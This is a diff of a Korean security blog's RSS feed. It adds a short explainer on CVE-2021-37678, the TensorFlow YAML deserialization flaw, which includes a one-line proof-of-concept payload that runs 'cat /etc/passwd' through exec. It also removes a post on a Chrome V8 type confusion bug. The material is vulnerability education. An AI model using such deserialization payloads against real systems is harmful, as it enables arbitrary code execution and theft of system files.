@@ -9,8 +9,42 @@
     <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>hack &amp; life</description>
-    <pubDate>Wed, 08 Sep 2021 12:33:25 GMT</pubDate>
+    <pubDate>Thu, 09 Sep 2021 04:20:19 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-37678: Google TensorFlow의 임의 코드 실행 취약점과 YAML 지원 중단</title>
+      <link>https://hackyboiz.github.io/2021/09/09/l0ch/2021-09-09/</link>
+      <guid>https://hackyboiz.github.io/2021/09/09/l0ch/2021-09-09/</guid>
+      <pubDate>Thu, 09 Sep 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/tensorflow/tensorflow/security/advisor</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r6jx-9g48-2r5r">Arbitrary code execution due to YAML deserialization</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Google TensorFlow &lt; 2.6.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>TensorFlow&#xB294; &#xBA38;&#xC2E0;&#xB7EC;&#xB2DD;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; Google&#xC758; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xD50C;&#xB7AB;&#xD3FC;&#xC785;&#xB2C8;&#xB2E4;. TensorFlow&#xC758; yaml &#xC9C0;&#xC6D0; &#xBAA8;&#xB4C8;&#xC5D0;&#xC11C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xACE0; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; CVE-2021-37678&#xB85C; &#xBA85;&#xBA85;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>TensorFlow&#xC758; Keras &#xBAA8;&#xB378; <code>model_from_yaml</code> &#xD568;&#xC218;&#xB294; yaml &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD574; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">@keras_export(&apos;keras.models.model_from_yaml&apos;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">model_from_yaml</span>(<span class="hljs-params">yaml_string, custom_objects=None</span>):</span>  <span class="hljs-keyword">if</span> yaml <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:    <span class="hljs-keyword">raise</span> ImportError(<span class="hljs-string">&apos;Requires yaml module installed (`pip install pyyaml`).&apos;</span>)  <span class="hljs-keyword">try</span>:    <span class="hljs-comment"># PyYAML 5.x+</span>    config = yaml.unsafe_load(yaml_string)  <span class="hljs-keyword">except</span> AttributeError:    config = yaml.load(yaml_string)  <span class="hljs-keyword">from</span> tensorflow.python.keras.layers <span class="hljs-keyword">import</span> deserialize  <span class="hljs-comment"># pylint: disable=g-import-not-at-top</span>  <span class="hljs-keyword">return</span> deserialize(config, custom_objects=custom_objects)</code></pre><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xD558;&#xB294; yaml&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xBD80;&#xC871;&#xD574; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xC544;&#xB798; <code>cat /etc/passwd</code>&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; <code>model_from_yaml</code> &#xD568;&#xC218;&#xC758; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xD574; &#xC2E4;&#xD589;&#xD558;&#xB294; PoC&#xC640; &#xAC19;&#xC774; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> tensorflow.keras <span class="hljs-keyword">import</span> modelspayload = <span class="hljs-string">&apos;&apos;&apos;</span><span class="hljs-string">!!python/object/new:type</span><span class="hljs-string">args: [&apos;z&apos;, !!python/tuple [], {&apos;extend&apos;: !!python/name:exec }]</span><span class="hljs-string">listitems: &quot;__import__(&apos;os&apos;).system(&apos;cat /etc/passwd&apos;)&quot;</span><span class="hljs-string">&apos;&apos;&apos;</span>  models.model_from_yaml(payload)</code></pre><p>Google&#xC740; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC218;&#xC815;&#xD558;&#xB294; <a href="https://github.com/tensorflow/tensorflow/commit/23d6383eb6c14084a8fc3bdf164043b974818012">&#xCEE4;&#xBC0B;&#xC5D0;&#xC11C;</a> YAML &#xC9C0;&#xC6D0;&#xC744; &#xC911;&#xB2E8;&#xD558;&#xACE0; &#xD328;&#xCE58;&#xB97C; 2.6.0&#xC5D0;&#xC11C; &#xB9B4;&#xB9AC;&#xC988;&#xD568;&#xACFC; &#xB3D9;&#xC2DC;&#xC5D0; &#xC774;&#xC804; &#xBC84;&#xC804;&#xC5D0;&#xB3C4; backporting &#xD558;&#xACA0;&#xB2E4;&#xACE0; &#xBC1D;&#xD614;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/deserialization/">deserialization</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/google/">google</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/tensorflow/">tensorflow</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/09/09/l0ch/2021-09-09/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>[Daily-Life] 부산까지 가서 발표한 썰 푼다, 시원포럼 발표 후기</title>
@@ -139,13 +173,13 @@
       <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/dacl/">dacl</category>
-      
       <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
       
       <category domain="https://hackyboiz.github.io/tags/acl/">acl</category>
       
       <category domain="https://hackyboiz.github.io/tags/ace/">ace</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/dacl/">dacl</category>
       
       <category domain="https://hackyboiz.github.io/tags/sacl/">sacl</category>
       
@@ -542,13 +576,13 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/integer-overflow/">integer overflow</category>
-      
       <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
       
       <category domain="https://hackyboiz.github.io/tags/spoofing/">spoofing</category>
       
       <category domain="https://hackyboiz.github.io/tags/post/">post</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/integer-overflow/">integer overflow</category>
       
       
       <comments>https://hackyboiz.github.io/2021/08/23/fabu1ous/2021-08-23/#disqus_thread</comments>
@@ -658,40 +692,6 @@
       
       
       <comments>https://hackyboiz.github.io/2021/08/18/l0ch/procmon-lpe/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-30517: Chrome V8 엔진의 Type Confusion 취약점</title>
-      <link>https://hackyboiz.github.io/2021/08/17/l0ch/2021-08-17/</link>
-      <guid>https://hackyboiz.github.io/2021/08/17/l0ch/2021-08-17/</guid>
-      <pubDate>Tue, 17 Aug 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=120</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1203122">Issue 1203122: Security: Type confusion bug in LoadSuperIC</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Chrome V8</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Chrome V8&#xC5D4;&#xC9C4;&#xC758; <a href="https://mathiasbynens.be/notes/shapes-ics">&#xC778;&#xB77C;&#xC778; &#xCE90;&#xC2DC;(IC)</a> &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; type confusion &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>AccessorAssembler::LoadSuperIC</code>&#xC640; <code>AccessorAssembler::HandleLoadICHandlerCase</code> &#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AccessorAssembler::LoadSuperIC</span><span class="hljs-params">(<span class="hljs-keyword">const</span> LoadICParameters* p)</span> </span>{...BIND(&amp;non_inlined);  {    <span class="hljs-comment">// LoadIC_Noninlined can be used here, since it handles the</span>    <span class="hljs-comment">// lookup_start_object != receiver case gracefully.</span>    LoadIC_Noninlined(p, lookup_start_object_map, strong_feedback, &amp;var_handler,                      &amp;if_handler, &amp;miss, &amp;direct_exit);  }...}</code></pre><p><code>LoadSuperIC</code> &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C; <code>LoadIC_Noninlined</code>&#xB294; <code>lookup_start_object != receiver</code> &#xC758; &#xACBD;&#xC6B0;&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AccessorAssembler::HandleLoadICHandlerCase</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">...</span></span><span class="hljs-function"><span class="hljs-params">  BIND(&amp;call_handler); &lt;------- [<span class="hljs-number">6</span>]</span></span><span class="hljs-function"><span class="hljs-params">  {</span></span><span class="hljs-function"><span class="hljs-params">    exit_point-&gt;ReturnCallStub(LoadWithVectorDescriptor{}, CAST(handler),</span></span><span class="hljs-function"><span class="hljs-params">                               p-&gt;context(), p-&gt;receiver(), p-&gt;name(),</span></span><span class="hljs-function"><span class="hljs-params">                               p-&gt;slot(), p-&gt;<span class="hljs-built_in">vector</span>());</span></span><span class="hljs-function"><span class="hljs-params">  }</span></span><span class="hljs-function"><span class="hljs-params">}</span></span></code></pre><p>&#xADF8;&#xB7EC;&#xB098; <code>HandleLoadICHandlerCase</code> &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C; <code>lookup_start_object != receiver</code>&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <code>p&#x2192;lookup_start_object()</code> &#xB300;&#xC2E0; <code>p&#x2192;receiver()</code>&#xB97C; &#xC804;&#xB2EC;&#xD574; &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; type confusion&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD574;&#xCEE4;&#xAC00; Object&#xB97C; StringWrapper&#xB85C; type confusion&#xD574; &#xAC1D;&#xCCB4;&#xC758; &#xC694;&#xC18C; &#xC8FC;&#xC18C;&#xB97C; leak&#xD558;&#xAC70;&#xB098; &#xBC30;&#xC5F4;&#xC744; &#xD568;&#xC218;&#xB85C; &#xC0DD;&#xAC01;&#xD558;&#xAC8C;&#xB054; &#xAC1D;&#xCCB4;&#xB97C; &#xC18D;&#xC5EC; arbitrary read/write primitive&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/chrome/">chrome</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/v8/">v8</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/type-confusion/">type confusion</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/08/17/l0ch/2021-08-17/#disqus_thread</comments>
       
     </item>
     
